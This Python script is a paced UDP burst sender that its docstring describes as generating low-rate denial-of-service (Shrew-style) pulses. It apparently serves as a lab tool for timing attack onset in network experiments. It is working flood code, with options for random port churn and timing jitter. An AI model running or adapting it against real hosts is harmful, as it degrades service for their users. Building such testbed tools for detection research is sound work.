#!/usr/bin/env python3
"""
udp_pulse.py — paced periodic UDP burst sender (LDoS / Shrew-style pulses, or bursty benign traffic).

Every `period_ms`, sends packets at `rate_pps` for `burst_ms`. Logs the epoch time of the
very first packet and every burst start, so attack onset is measured at the sender (not
when the shell command was typed).

  python3 udp_pulse.py --dst 10.0.4.1 --dport 5001 --burst-ms 200 --period-ms 1000 \
      --rate-pps 2000 --size 1000 --duration 60 --phase-ms 0 --log /tmp/att_h22.csv
"""
import argparse, socket, time, csv, random

ap = argparse.ArgumentParser()
ap.add_argument("--dst", required=True)
ap.add_argument("--dport", type=int, default=5001, help="-1 = random destination port per packet (flow churn)")
ap.add_argument("--sport", type=int, default=0, help="0 = kernel-chosen fixed port; -1 = random per burst")
ap.add_argument("--burst-ms", type=float, default=200); ap.add_argument("--period-ms", type=float, default=1000)
ap.add_argument("--rate-pps", type=float, default=2000); ap.add_argument("--size", type=int, default=1000,
                help="UDP payload bytes (IP packet = size + 28)")
ap.add_argument("--duration", type=float, default=60); ap.add_argument("--phase-ms", type=float, default=0)
ap.add_argument("--jitter-ms", type=float, default=0, help="uniform jitter added to each period")
ap.add_argument("--log", required=True)
a = ap.parse_args()

payload = b"\x00" * max(a.size, 0)
gap = 1.0 / a.rate_pps


def new_sock():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 << 20)
    if a.sport > 0: s.bind(("0.0.0.0", a.sport))
    return s


sock = new_sock()
f = open(a.log, "w", newline=""); w = csv.writer(f)
w.writerow(["event", "t", "burst_idx", "pkts_sent", "bytes_ip"])
time.sleep(a.phase_ms / 1000.0)
t_start = time.time(); burst = 0; total = 0; first = True
while time.time() - t_start < a.duration:
    if a.sport == -1:
        sock.close(); sock = new_sock()
    t_b = time.time(); n = 0
    w.writerow(["burst_start", t_b, burst, total, total * (a.size + 28)])
    nxt = t_b
    while time.time() - t_b < a.burst_ms / 1000.0:
        try:
            sock.sendto(payload, (a.dst, a.dport if a.dport > 0 else random.randint(1024, 65000))); n += 1
            if first:
                w.writerow(["first_packet", time.time(), burst, 1, a.size + 28]); f.flush(); first = False
        except OSError:
            pass
        nxt += gap
        d = nxt - time.time()
        if d > 0: time.sleep(d)
    total += n
    w.writerow(["burst_end", time.time(), burst, total, total * (a.size + 28)])
    burst += 1
    sleep_to = t_b + (a.period_ms + random.uniform(-a.jitter_ms, a.jitter_ms)) / 1000.0
    d = sleep_to - time.time()
    if d > 0: time.sleep(d)
w.writerow(["end", time.time(), burst, total, total * (a.size + 28)])
f.close()
